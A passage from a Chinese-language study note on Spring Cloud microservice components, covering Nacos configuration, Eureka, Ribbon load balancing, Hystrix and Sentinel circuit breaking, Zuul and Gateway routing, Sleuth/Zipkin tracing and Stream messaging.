不在默认的组，不支持动态刷新spring.cloud.nacos.config.extension-configs[1].data-id=ext-config-common02.propertiesspring.cloud.nacos.config.extension-configs[1].group=GLOBALE_GROUP# 3、Data Id 既不在默认的组，也支持动态刷新spring.cloud.nacos.config.extension-configs[2].data-id=ext-config-common03.propertiesspring.cloud.nacos.config.extension-configs[2].group=REFRESH_GROUPspring.cloud.nacos.config.extension-configs[2].refresh=true\n\n可以看到:\n\n通过 spring.cloud.nacos.config.extension-configs[n].data-id 的配置方式来支持多个 Data Id 的配置。\n通过 spring.cloud.nacos.config.extension-configs[n].group 的配置方式自定义 Data Id 所在的组，不明确配置的话，默认是 DEFAULT_GROUP。\n通过 spring.cloud.nacos.config.extension-configs[n].refresh 的配置方式来控制该 Data Id 在配置变更时，是否支持应用中可动态刷新， 感知到最新的配置值。默认是不支持的。\n\n多个 Data Id 同时配置时，他的优先级关系是 spring.cloud.nacos.config.extension-configs[n].data-id 其中 n 的值越大，优先级越高。\nspring.cloud.nacos.config.extension-configs[n].data-id 的值必须带文件扩展名，文件扩展名既可支持 properties，又可以支持 yaml&#x2F;yml。 此时 spring.cloud.nacos.config.file-extension 的配置对自定义扩展配置的 Data Id 文件扩展名没有影响。\n通过自定义扩展的 Data Id 配置，既可以解决多个应用间配置共享的问题，又可以支持一个应用有多个配置文件。\n为了更加清晰的在多个应用间配置共享的 Data Id ，你可以通过以下的方式来配置：\n# 配置支持共享的 Data Idspring.cloud.nacos.config.shared-configs[0].data-id=common.yaml# 配置 Data Id 所在分组，缺省默认 DEFAULT_GROUPspring.cloud.nacos.config.shared-configs[0].group=GROUP_APP1# 配置Data Id 在配置变更时，是否动态刷新，缺省默认 falsespring.cloud.nacos.config.shared-configs[0].refresh=true\n\n可以看到：\n\n通过 spring.cloud.nacos.config.shared-configs[n].data-id 来支持多个共享 Data Id 的配置。\n通过 spring.cloud.nacos.config.shared-configs[n].group 来配置自定义 Data Id 所在的组，不明确配置的话，默认是 DEFAULT_GROUP。\n通过 spring.cloud.nacos.config.shared-configs[n].refresh 来控制该Data Id在配置变更时，是否支持应用中动态刷新，默认false。\n\n\n配置的优先级\nSpring Cloud Alibaba Nacos Config 目前提供了三种配置能力从 Nacos 拉取相关的配置。\n\nA: 通过 spring.cloud.nacos.config.shared-configs[n].data-id 支持多个共享 Data Id 的配置\nB: 通过 spring.cloud.nacos.config.extension-configs[n].data-id 的方式支持多个扩展 Data Id 的配置\nC: 通过内部相关规则(应用名、应用名+ Profile )自动生成相关的 Data Id 配置\n\n当三种方式共同使用时，他们的一个优先级关系是:A &lt; B &lt; C\n\n完全关闭配置\n通过设置 spring.cloud.nacos.config.enabled &#x3D; false 来完全关闭 Spring Cloud Nacos Config\n\n\nConsul（注册中心和配置中心）功能Consul是HashiCrop公司推出的开源工具，提供了服务注册和发现、分布式一致性协议实现、健康检查、Key&#x2F;Value存储、多数据中心方案等。\n使用方法\n启动Consul服务，可以使用Docker等方法启动Consul。\n其它步骤参加Zookeeper的使用方法，不同的是依赖是spring-cloud-consul-discovery\n\nEureka（注册中心）功能和组成Eureka提供了完整的服务注册和服务发现功能，以及负载均衡、故障转移的功能。\n主要包含两个部分：Eureka Client、Eureka Server：\n\nEureka Server: 服务注册中心，用于管理各种微服务实例的注册与发现。Eureka Server提供了一种能力，让各个微服务之间彼此连接并互相感知。每当有新的微服务被启动时，它会向Eureka Server节点发送一个REST请求，并且在该服务器上进行注册。同时，对于已经注册的微服务，Eureka Server会接收并存储它们发送的心跳信息，以便为客户端提供最新可用的服务列表。\n\nEureka Client: （微）服务实例，用于与Eureka Server注册中心进行交互。Eureka Client会向Eureka Server注册自己，并定期发送心跳消息来更新它的状态。同时，它还可以查询Eureka Server上已注册的其他微服务实例的信息，并通过负载均衡算法从可用的微服务列表中选择合适的服务来处理请求。服务提供方和服务消费方都是Eureka Client。\n\n\nEureka Server和Eureka Client之间的协作使得微服务可以快速地、灵活地进行部署和扩展，并且可以轻松地进行服务监控和故障排除。\n使用方法\n在Eureka Server中，添加pom依赖（spring-cloud-strater-eureka-server），在启动类上添加@EnableEurekaServer注解表示该服务是一个EurekaServer。\n在Eureka Client中，添加pom依赖（spring-cloud-strater-eureka），在application.yml中添加配置（配置注册中心的地址defaultZone和自身的名字name），在启动类上添加@EnableEurekaClient注解表示该服务是一个EurekaClient。\n\n健康检查Eureka通过客户端（Eureka Client）的心跳包来检测客户端状态，但是这种方式只能检测客户端是否在线，不能保证客户端可以对外提供服务，这是因为客户端可能依赖了其它的资源，如数据库、缓存等，如果其依赖的服务无法正常使用，那么即使客户端在线，也不能对外提供服务，这时就需要客户端自己向Eureka Server提供自身的状态。\n开启Eureka的健康检查，客户端就能将自身状态就可以传送给Eureka Server了。在application.yml中添加配置即可开启Eureka的健康检查。\nEureka Client有如下状态：UP、DOWN、STARTING、OUT_OF_SERVICE、UNKNOWN\n自我保护模式自我保护模式是一种应对网络异常的安全保护机制，它的理念是宁可同时保留所有实例（健康的实例和不健康的实例），也不盲目注销任何健康的实例。\n就近原则Eureka有Region和Zone的概念，Region可以理解为区、Zone可以理解为机房。Eureka Serve启动时需要指定自己所在的Zone。Eureka Client启动时也需要指定Zone，Eureka Client会优先请求自己的Zone下的Eureka Serve列表中的Eureka Serve；如果没有指定，会默认使用defaultZone作为自己的Zone。\nConfig（配置中心）功能、特点和组成在研发流程中有测试环境、UAT（User Acceptance Testing，用户验收测试）环境、生产环境等，每个微服务对应多个不同环境的配置文件，修改配置文件十分繁琐。这就需要引入配置中心组件。\nSpring Cloud Config提供了分布式配置管理功能。特点如下：\n\n服务器存储后端的默认实现使用git。\n支持丰富的文件格式，包括yml、json、properities等，还可以自定义文件格式。\n配合Spring Cloud Bus可实现配置推送。\nSpring Boot项目中不需要改动代码，加入一个启动配置文件指明使用Config Server中哪个配置文件即可。\n\n主要包含两个部分：Config Client、Config Server。\n使用方法\nConfig的配置必须放在bootstrap.properities中，才能被正确加载，因为放在bootstrap.properities中才能确保config相关的配置先于application.properities加载（bootstrap.properities的加载先于application.properities）。\n在Config Server中，添加pom依赖，在启动类上添加@EnableConfigServer注解表示允许该服务以HTTP形式对外提供配置管理服务。\n在Config Client中，添加pom依赖，在启动类上添加@EnableAutoConfiguration注解表示自动向Config Server获取项目的配置。\n\n热生效热生效是指，让修改后的配置动态生效。\n用法是在Config Client的启动类上添加@RefreshScope注解。此外，还需要搭配Spring Cloud Bus，通知Config Client进行本地配置更新。\n高可用通过将所有Config Server实例以服务提供方的形式注册到Eureka上，Config Client以服务消费方的形式区Eureka获取Config Server的实例。由Eureka提供故障转移、服务注册和发现等功能。\n使用方法：\n\n在Config Server（作为Eureka Client）添加pom依赖，在配置文件application.yml中添加对Eureka注册中心的配置，在启动类上添加注解（具体方法见Eureka的使用方法之Eureka Client的配置方法）。\n\n在Config Client（也是作为Eureka Client）添加pom依赖，在启动类上添加注解（具体方法见Eureka的使用方法之Eureka Client的配置方法）。\n不同的是添加配置的位置是bootstrap.yml，在bootstrap.yml中添加对Eureka注册中心的配置，并在原Config Client配置的基础上删除spring.cloud.config.uri的静态的指定，改为将spring.cloud.config.discovery.enabled设为true， 并通过spring.cloud.config.discovery.serviceId指定在注册中心配置的serviceId。\n\n\n负载均衡分类负载均衡可以简单分为 服务端负载均衡 和 客户端负载均衡 这两种。\n\n服务端负载均衡 主要应用在 系统外部请求 和 网关层 之间，可以使用 软件 或者 硬件 实现。软件负载均衡通过软件（比如 LVS、Nginx、HAproxy ）实现负载均衡功能\n\n\n客户端负载均衡 主要应用于系统内部的不同的服务之间，可以使用现成的负载均衡组件来实现。在客户端负载均衡中，客户端会自己维护一份服务器的地址列表，发送请求之前，客户端会根据对应的负载均衡算法来选择具体某一台服务器处理请求。\n\n\n\n负载均衡常见的算法\n随机法\n策略：每次从可用的服务实例列表中随机选择一个实例来处理请求，可以设置权重。\n权重：如果没有配置权重的话（适合于服务器性能相近的集群），所有的服务器被访问到的概率都是相同的。如果配置权重（适合于服务器性能不等的集群）的话，权重越高的服务器被访问的概率就越大。\n缺陷：部分机器在一段时间之内无法被随机到。轮询法可以避免这个问题\n\n轮询法\n策略：挨个轮询服务器处理，也可以设置权重。\n\n一致性 Hash 法\n策略：相同参数的请求总是发到同一台服务器处理，比如同个 IP 的请求。\n\n最小连接法\n策略：当有新的请求出现时，遍历服务器节点列表并选取其中活动连接数最小的一台服务器来响应当前请求。活动连接数可以理解为当前正在处理的请求数。\n最小连接法可以尽可能最大地使请求分配更加合理化，提高服务器的利用率。\n缺陷：这种方法实现起来最复杂，需要监控每一台服务器处理的请求连接数。\n\n\nRibbon功能Ribbon最主要的功能是提供了客户端的负载均衡算法，还提供了一系列完整的服务调用配置项，如连接超时、失败重试、访问权重、调用优先级等。\n使用方法\n在Eureka的客户端代码的基础上进行改造\n将DiscoveryClient改为LoadBalancerClient，并调用其choose方法，会使原先得到的ServiceInstance集合变为得到单个ServiceInstance实例。\n\n使用@LoadBalanced注解\n在启动类上（通常，有时也用在配置类上、组件类上等）使用@RibbonClient注解设置需要调用的服务名，在RestTemplate的bean对象上使用@LoadBalanced注解。\n如果想要自定义参数和策略，就需要使用自定义配置：\n\n使用@RibbonClient注解时，可以设置configuration的值来自定义配置类。\n也可以使用配置文件，在配置文件中指定使用的配置类\n\n\n\n负载均衡策略Ribbon 支持的 7 种负载均衡策略：\n\nRandomRule：随机策略。\nRoundRobinRule（默认）：轮询策略\nWeightedResponseTimeRule：权重（根据响应时间决定权重）策略\nBestAvailableRule：最小连接数策略\nRetryRule：重试策略（按照轮询策略来获取服务，如果获取的服务实例为 null 或已经失效，则在指定的时间之内不断地进行重试来获取服务，如果超过指定时间依然没获取到服务实例则返回 null）\nAvailabilityFilteringRule：可用敏感性策略（先过滤掉非健康的服务实例，然后再选择连接数较小的服务实例）\nZoneAvoidanceRule：区域敏感性策略（根据服务所在区域的性能和服务的可用性来选择服务实例）\n\nLoadBalancer负载均衡策略Spring Cloud LoadBalancer 支持的 2 种负载均衡策略：\n\nRandomLoadBalancer：随机策略\nRoundRobinLoadBalancer（默认）：轮询策略\n\n熔断器（断路器）补充限流算法\n漏桶算法：漏捅按固定流量流出\n令牌桶算法：生成令牌的速度是恒定的，而拿令牌的数量是没有限制的\n固定时间窗口法：在一个时间间隔内进行限制，存在临界点缺陷，在时间临界点前后的极短时间内容易遭受攻击\n滑动时间窗口算法：可以有效规避固定时间窗口算法中时间临界点的问题\n\n隔离方法\n线程池隔离：给服务调用设置固定数量的线程，如果被调用服务的正在被使用的线程数达到了限制的数量，就不会再调用，使用存在代价，代价包括线程的上下文切换。\n信号量隔离：信号量隔离是使用Semaphore实现的，通过设置的最大信号量控制对资源调用的数量，拿不到信号时直接拒绝。\n通过响应时间隔离：当依赖的资源出现响应时间过长的情况，就拒绝对该资源的请求。\nQPS（每秒请求次数）隔离：当调用服务的QPS达到阈值时，就拒绝。\n\n熔断概念当下游服务不可用时，上游服务为了保证自身服务的可用性，不再继续调用目标服务，而是直接返回。\n降级概念降级是系统将某些不重要的业务或接口的功能停止，以应对高负载的场景。\nHystrix微服务架构中一般存在较多的服务单元，这样就出现某个单元因为网络原因等问题出现延迟，如果此时请求方的请求不断增多，时间一长就会形成调用方的任务积压，阻塞请求占用大量的系统的线程、IO等资源，导致调用方的服务瘫痪。进一步的会影响调用方的上游，从而产生“雪崩效应”。\n\n雪崩效应（Avalanche Effect）是指在分布式系统中，由于某个服务的故障或不可用，从而导致整个系统的连锁反应，最终导致整个系统无法正常工作的现象。\n具体来说，当一个服务出现故障时，其它依赖该服务的服务都会请求该服务，并等待响应。如果这些请求全部被堵塞住或响应时间过长，则会消耗掉资源，进而阻塞或延迟其它请求，造成一系列连锁反应。这可能会导致更多的请求堆积，使整个系统变得异常缓慢或直接崩溃。\n为了避免雪崩效应，需要考虑以下几种解决方案：\n\n限流：限制对服务的访问量和频率，避免过多的请求排队等待。\n降级：在一定条件下降低服务的质量和功能，如缩短超时时间、返回默认值等，以保证系统的稳定性。\n熔断：在服务发生故障时快速断开与该服务的连接，并通过降级方式替代该服务响应请求，以避免因故障而导致其它服务出现雪崩效应。\n\n综上所述，为了保证分布式系统的健壮性和可用性，在设计和实现中需要充分考虑服务之间的依赖和关系，并采取一些必要的措施来避免或应对雪崩问题。\n\n为解决这一问题，可以使用熔断器（Circuit Breaker）。\n熔断器的原理是：当某个服务单元发生故障，通过熔断器的故障监控，向调用方返回一个错误请求，而不是长时间的等待响应，避免故障在分布式系统中蔓延。\n熔断原理Hystrix提供了熔断模式和隔离模式来缓解雪崩效应。这两种方案都属于阻塞发生之后的应对策略，而非预防性策略（如限流）。\n\n熔断模式（服务熔断）\n如果某个服务响应调用太慢，则熔断对该服务的调用，即后续请求不再调用该服务，直接返回并快速释放资源。\n熔断恢复：被熔断的请求不是永久被切断，而是暂停一段时间（默认是5秒）之后允许部分请求通过，若请求都是健康的（ResponseTime&lt;250ms），则取消熔断。\n\n隔离模式（服务降级）\n为每个依赖调用分配一个线程池，如果线程池已满，调用将立即被拒绝，加速失败时间。\n\n\n服务调用的各种结果（成功、异常、超时、拒绝）都会上报给熔断器，加入bucket计算发生的总数。\n使用方法\n引入Hystrix的maven依赖，spring-cloud-starter-hystrix\n\n在启动类中添加@EnableCircutBreaker注解或@EnableHystrix注解\n\n在controller方法上添加@HystrixCommand，表示开启对该方法的熔断检测功能。\n\n配置方法：\n\n直接对@HystrixCommand注解的commandProperities设置@HystirxProperities注解的参数进行配置。\n使用配置文件进行配置，Hystrix的大部分配置都以hystrix.command开头\n\n可以配置的参数包括：\n\n隔离策略的超时时间\n最大请求数\n进行短路的失败请求的次数阈值\n短路后多长时间之后进行重试\n出错百分比阈值\n……\n\n\n\n监测工具熔断的监测工具有两个：\n\nHystrix Dashboard：针对Hystrix进行实时监控的工具，通过Hystrix Dashboard可以直观的看到各个Hystrix命令的请求响应时间、请求成功率等数据。\nTurbine：只使用Hystrix Dashboard只能看到单个应用内的服务信息，而Turbine能够汇总系统内多个服务的数据并显示到Hystrix Dashboard上。\n\nHystrix Dashboard和Turbine监测工具使用方法：\n\n在需要被监测的项目中，引入依赖spring-boot-starter-actuator\n在仪表盘应用中，引入依赖spring-cloud-starter-hystrix-dashboard，主类中添加@EnableHystrixDashboard注解开启仪表板\n在上面创建的仪表盘应用中，继续添加Turbine的依赖spring-cloud-starter-turbine，在配置文件application.yml中添加配置信息，除了要配置Turbine，还需要指定Eureka的地址，使Turbine能够到注册中心查找需要监测的服务实例。\n在被监测的服务项目中，也需要进行配置，保证配置中的eureka.instance.metadata-map.cluster和Turbine中的clusterConfig的配置名称一致。\n请求Turbine的聚合监测面板地址就能看到聚合后的图形化监测信息。\n\nSentinel功能 Sentinel 以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。\nSentinel在服务隔离的实现方式和Hystrix完全不一样，Hystrix使用的是通过线程池隔离，而Sentinel采用了两种不同的手段，信号量隔离、响应时间隔离、QPS隔离。\nSentinel的系统负载保护意思是，Sentinel从系统的维度提供了保护，确保系统的入口流量和系统的负载达到一个平衡，保证系统在能力范围内处理最多的请求。\n使用方法\n引入依赖spring-cloud-starter-alibaba-sentinel\n添加配置，如Sentinal DashBoard的地址、端口\n在Service类要使用Sentinel的方法上使用@SentinelResource注解\n\nSentinel持久化无论是通过硬编码的方式来更新规则，还是通过接入 Sentinel Dashboard 后，在页面上操作来更新规则，都无法避免一个问题，那就是服务重新后，规则就丢失了，因为默认情况下规则是保存在内存中的。\n目前 Sentinel 中默认实现了5种规则持久化的方式，分别是：file、redis、nacos、zk和apollo。\n使用方法：\n\n引入sentinel持久化依赖\n增加配置\n实现init()函数\n\nSentinal DashBoard配置项流控模式\n直接：api达到限流条件时，直接限流\n关联：当关联的资源达到阈值时，就限流自己\n链路：只记录指定链路上的流量（指资源从入口资源进来的流量，如果达到阈值，就进行限流）\n\n流控效果\n快速失败：直接失败并抛出异常\nWarm UP：当系统长期处于低水位的情况下，流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。比如刚启动的服务，数据库连接池可能还未初始化，缓存也处于空的状态，这时候激增的流量非常容易导致服务崩溃。这时我们就可以利用 Sentinel 的 Warm-Up 流控模式，控制通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，而不是在一瞬间全部放行。这样可以给冷系统一个预热的时间，避免冷系统被压垮。\n排队等待（匀速排队模式）：这种方式适合用于请求以突刺状来到，这个时候我们不希望一下子把所有的请求都通过，这样可能会把系统压垮；同时我们也期待系统以稳定的速度，逐步处理这些请求，以起到“削峰填谷”的效果，而不是拒绝所有请求。\n\n熔断降级Sentinel 提供以下几种熔断策略：\n\n慢调用比例 (SLOW_REQUEST_RATIO)：选择以慢调用比例作为阈值，需要设置允许的慢调用 RT（即最大的响应时间），请求的响应时间大于该值则统计为慢调用。当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且慢调用的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求响应时间小于设置的慢调用 RT 则结束熔断，若大于设置的慢调用 RT 则会再次被熔断。\n异常比例 (ERROR_RATIO)：当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且异常的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。\n异常数 (ERROR_COUNT)：当单位统计时长内的异常数目超过阈值之后会自动进行熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。\n\n热点参数限流热点参数限流会根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。\nSentinel 利用 LRU 策略统计最近最常访问的热点参数，结合令牌桶算法来进行参数级别的流控。\n要使用热点参数限流功能，需要引入sentinel-parameter-flow-control，并使用@SentinelResource 注解（与Hysyrix的@HysyrixCommand类似）定义资源\n声明式RESTful客户端Feign使用Ribbon的缺点是需要对请求拼接参数，而Feign解决了这个问题。使用Feign，可以通过定义接口并添加注解的方式来描述服务间的交互，而无需手动编写HTTP请求代码。\n使用方法\n添加依赖：spring-cloud-starter-feign\n\n在启动类上添加注解：@EnableFeignClients，该注解的defaultConfiguration属性可以指定所有Feign接口的配置类。\n\n定义Feign接口：使用@FeignClient(name&#x3D;”xxx”)注解定义Feign接口。\n该注解除了name属性还有，可以指定用户自定义的配置类的configuration属性，可以在使用了Hystrix的服务中指定熔断的FallBack类的fallback属性。\n\n\n路由网关API 网关是一个搭建在客户端和微服务之间的服务，我们可以在 API 网关中处理一些非业务功能的逻辑，例如权限验证、监控、缓存、请求路由等。\nAPI 网关就像整个微服务系统的门面一样，是系统对外的唯一入口。有了它，客户端会先将请求发送到 API 网关，然后由 API 网关根据请求的标识信息将请求转发到微服务实例。\nZuul功能Zuul的具体作用就是服务转发，Zuul可以作为为资源的统一访问入口。\n此外Zuul还提供了过滤器的功能，可以用来进行接口权限校验、限流、统计等。\n使用方法Zuul用做服务转发的使用方法：\n\n添加pom依赖，spring-cloud-starter-zuul\n\n在启动类上添加@EnableZuulProxy注解\n\n在application.yml文件中添加配置，zuul.routes的配置格式如下：\n#第一种[serviceId]:\t\t\t\t\t#对应Eureka中的serviceId，规则名与serviceId相同\tpath: /providerURL/**\t\t#转发哪些path（URL的path部分，见下文的补充）#第二种customName1:\t\t\t\t\t#自定义的转发规则名称\tpath: /fromURL1/**\t\t\t#转发哪些path\turl: http://localhost:8081\t#转发到哪个scheme://domain:portcustomName2:\t\t\t\t\t\tpath: /fromURL2/**\t\t\t\turl: http://localhost:8082\t\n\n示例：\nzuul:  host:    socket-timeout-millis: 60000    connect-timeout-millis: 60000  routes:    frameFronted:      path: /fronted/frame/**      url: http://localhost:8111    loginFronted:      path: /fronted/login/**      url: http://localhost:8222\n\n其它配置参数：\n\n忽略匹配：ingoredPatterns参数可以配置忽略URL\n敏感Header过滤：在请求的转发中默认会转发HTTP的Header信息，然而可能有些敏感信息不能被转发给下游系统，如Cookie。可以通过sensitiveHeaders参数进行配置，各项之间使用逗号分隔。\n\n匹配顺序：如果想按配置的顺序进行路由规则控制，则需要使用YMAL，如果使用的是properities文件，则会丢失顺序。\n补充：\nURL结构：\n\n\nGateway功能和特点Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。\nSpring Cloud Gateway 旨在提供一种简单而有效的途径来发送 API，并为它们提供横切关注点，例如：安全性，监控&#x2F;指标和弹性。 \n\nSpring Cloud Gateway 是基于 WebFlux 框架实现的，而 WebFlux 框架底层则使用了高性能的 Reactor 模式通信框架 Netty。\n\nSpring Cloud Gateway 具有以下特性：\n\n基于 Spring Framework 5、Project Reactor 和 Spring Boot 2.0 构建。\n能够在任意请求属性上匹配路由。\npredicates（断言） 和 filters（过滤器）是特定于路由的。\n集成了 Hystrix 熔断器。\n集成了 Spring Cloud DiscoveryClient（服务发现客户端）。\n易于编写断言和过滤器。\n能够限制请求频率。\n能够重写请求路径。\n\n可以通过配置使Gateway兼容HTTPS请求，\n核心概念（Glossary）\nSpring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。\n\n\n\n核心概念\n描述\n\n\n\nRoute（路由）\n网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。\n\n\nPredicate（断言）\n路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。\n\n\nFilter（过滤器）\n过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对上文的响应进行再处理。\n\n\n\n注意：其中 Route 和 Predicate 必须同时声明（路由断言）。\n\n断言的类型\nAfter\nBefore\nBetween\nCookie\nHeaders\nHost\nMethod\nPath\nQuery\nRemoteAddr\n\n多个路由断言可以通过与或非等逻辑连接。\n过滤器的类型\nAddRequestHeader\nAddRequestParameter\nAddResponseHeader\nHystrix\nPrefixPath\nRedictTo\nRemoteNonProxyHeaders\nRemoveRequestHeader\nRemoveResponseHeader\nRewritePath\nSaveSession\nSetPath\nSetResponseHeader\nSetStatus\nStripPrefix\nRetry\n\n工作流程如下图                                                                                                                                                                                                                                                                                                                       \n调用链跟踪Sleuth\nSleuth\n &#x2F; sluːθ\n侦查；侦察；警犬\n\n功能要实现准确快速地定位到线上故障，比较成熟的方案是使用调用链跟踪。调用链跟踪监测系统可以实现如下的功能：\n\n快速定位故障\n各个调用环节的性能分析\n数据分析\n\nSpring Cloud Sleuth是Spring Cloud生态中实现调用链跟踪的子项目，Spring Cloud Sleuth可以结合Zipkin，将消息发送到Zipkin，利用Zipkin存储信息，利用Zipkin UI展示数据，也可以只是简单的把数据存储在日记中。\n术语（Terminology）Spring Cloud Sleuth borrows Dapper’s terminology.\nSpan: The basic unit of work. For example, sending an RPC is a new span, as is sending a response to an RPC. Spans also have other data, such as descriptions, timestamped events, key-value annotations (tags), the ID of the span that caused them, and process IDs (normally IP addresses).\nSpans can be started and stopped, and they keep track of their timing information. Once you create a span, you must stop it at some point in the future.\nTrace: A set of spans forming a tree-like structure. For example, if you run a distributed big-data store, a trace might be formed by a PUT request.\nAnnotation&#x2F;Event: Used to record the existence of an event in time.\nConceptually in a typical RPC scenario we mark these events to highlight what kind of an action took place (it doesn’t mean that physically such an event will be set on a span).\n\ncs: Client Sent. The client has made a request. This annotation indicates the start of the span.\nsr: Server Received: The server side got the request and started processing it. Subtracting the cs timestamp from this timestamp reveals the network latency.\nss: Server Sent. Annotated upon completion of request processing (when the response got sent back to the client). Subtracting the sr timestamp from this timestamp reveals the time needed by the server side to process the request.\ncr: Client Received. Signifies the end of the span. The client has successfully received the response from the server side. Subtracting the cs timestamp from this timestamp reveals the whole time needed by the client to receive the response from the server.\n\nZipkin功能Zipkin是分布式实时数据追踪系统，由Twitter公司开发。主要功能是聚集来自各系统的实时监控数据。\n主要由四部分组成：\n\n收集器：收集追踪数据。\n数据存储：数据存储默认使用内存存储，也可以替换成MySQL、Cassandra等。\n查询：向其它服务服务提供数据查询功能\nWeb页面\n\n使用方法\n创建Zipkin Server、\n添加pom依赖zipkin-autoconfigure-ui和zipkin-server；\n在启动类中添加@EnableZipkinServer，表示启动Zipkin服务端。\n\n\n在服务中添加依赖和配置：\n添加对Sleuth的依赖spring-cloud-starter-sleuth（生成带有spanId和traceId的日志）和spring-cloud-sleuth-zipkin（将日志以HTTP协议传输到Zipkin Server）\n配置zipkin的base-url（Zipkin Server的地址）、sleuth的samper.percentage（创建并传输日志的传输比例）\n\n\n\n整合Stream由于将日志传输到Zipkin Server的方式是HTTP请求，请求量太大时会给系统带来很大压力，如果改为使用Stream消息机制传输监控日志就可以减轻压力。\nZipkin与Spring Cloud Stream整合的方法是：\n\n在Zipkin Server端\n添加对Stream消息中间件的依赖（以RabbitMQ为例）：spring-cloud-sleuth-zipkin-stream；spring-cloud-sleuth-stream；spring-cloud-stream-binder-rabbit。\n在配置文件中添加对Stream的配置信息和RabbitMQ的连接信息。\n将Zipkin Server的启动类注解@EnableZipkinServer改为@EnableZipkinStreamServer。\n\n\n在服务端\n将spring-cloud-sleuth-zipkin依赖注掉，在此基础上添加spring-cloud-sleuth-stream和spring-cloud-stream-binder-rabbit依赖。\n和在Zipkin Server端一样，配置文件中添加对Stream的配置信息和RabbitMQ的连接信息。\n\n\n\n整合MySQLZipkin默认将数据存储在内存中，如果要持久化这些数据可以整合MySQL.\nZipkin与MySQL整合的方法是：\n\n添加对JDBC和MySQL驱动的依赖，spring-boot-starter-jdbc和mysql-connector-java\n在配置文件中配置MySQL的连接信息，设置initialize参数为true（在启动时创建表结构  ）\n\n消息驱动Stream功能和概念在企业级应用中处理非同步场景、消息通知、应用间解耦等场景经常会使用消息中间件，常见的消息中间件有如，ActiveMQ、RabbitMQ、MetaMQ、Kafka、Redis等。\nSpring Cloud Stream是一个构建事件驱动或消息驱动微服务的框架，提供了一个灵活的编程模型，该模型建立在已经建立和熟悉的 Spring 习惯用法和最佳实践之上，包括对持久发布&#x2F;订阅语义、消费者组和有状态分区的支持。\n利用Stream可以对消息中间件实现进一步的封装，使代码更具有通用性，降低项目对消息中间件的耦合。更重要的是这一就可以方便地实现消息中间件的混用，比如生产者使用Kafka，消费者使用RabbitMQ。\nStream目前支持的中间件：\n\nRabbitMQ\nApache Kafka\nKafka Streams\nAmazon Kinesis\nGoogle PubSub (partner maintained)\nSolace PubSub+ (partner maintained)\nAzure Event Hubs (partner maintained)\nAzure Service Bus (partner maintained)\nAWS SQS (partner maintained)\nAWS SNS (partner maintained)\nApache RocketMQ (partner maintained)\n\n概念：\n\nBindings（绑定）：是一组接口，以声明方式标识输入和输出通道。在@EnableBinding注解中，你可以指定要绑定的通道集合。\nBinder（绑定器）：是消息中间件的实现，例如Kafka或RabbitMQ。绑定器负责将应用程序与特定的消息中间件进行连接和通信。\nChannel（通道）：代表消息中间件与应用程序之间的通信管道。通道可以是输入通道（用于接收消息）或输出通道（用于发送消息）。\nStreamListeners（流监听器）：是在Bean中定义的用于处理消息的方法。这些方法会自动在通道上接收到消息后被调用。在调用之前，消息转换器（MessageConverter）会执行消息的序列化和反序列化操作，将消息转换为中间件特定的事件和领域对象类型&#x2F;POJO之间进行转换。\nMessage Schemas（消息模式）：用于消息的序列化和反序列化的模式。消息模式可以静态地从位置读取或动态加载，支持领域对象类型的演进。消息模式可以确保消息在不同系统之间的一致性和互操作性。\n\n使用方法（以RabbitMQ为例）\n启动RabbitMQ服务，比如可以使用Docker启动RabbitMQ\n建两个Maven项目，分别作为消息的生产者和消费者\n均添加依赖spring-cloud-starter-stream（对Streram的依赖）和spring-cloud-starter-stream-rabbit（对RabbitMQ的依赖）。\n在消费者增加配置，配置消费的消息信息和RabbitMQ服务的信息\n在消费者启动类上添加@EnableBinding(BindingsInterface.class)，该注解表示为该Spring Boot项目增加Stream通道监听功能。BindingsInterface可以是sink、source、processor或三者的组合：\nsink：只带有输入通道的应用\nsource：只带有输出通道应用\nprocessor：带有输入通道和输出通道的应用\n\n\n创建BindingsInterface接口\n\n消息总线Bus功能Bus的一个常用功能是进行配置中心客户端的刷新。当Git Repository改变时，Bus会通过POST请求Config Server的&#x2F;bus&#x2F;refresh，Config Server会从Repository获取最新的信息并传递给Client。通过&#x2F;bus&#x2F;refresh的destination参数可以指定刷新某一台Client实例。\nBus的配置刷新通知功能是基于Spring的事件机制实现的，这些事件是可追踪的。\n短生命微服务Task功能官方对Spring Cloud Task的介绍十分简单明了：Spring Cloud Task allows a user to develop and run short lived microservices using Spring Cloud and run them locally, in the cloud, even on Spring Cloud Data Flow. Just add @EnableTask and run your app as a Spring Boot app (single application context).\nTask用于支持短生命周期的微服务，该类微服务常见于定时任务、批处理等场景。\n使用方法\n添加依赖spring-cloud-task-core\n在启动类添加@EnableTask注解\n\nTask默认将Task生命周期记录在内存中，可以和数据库集成将其存储到数据库中。 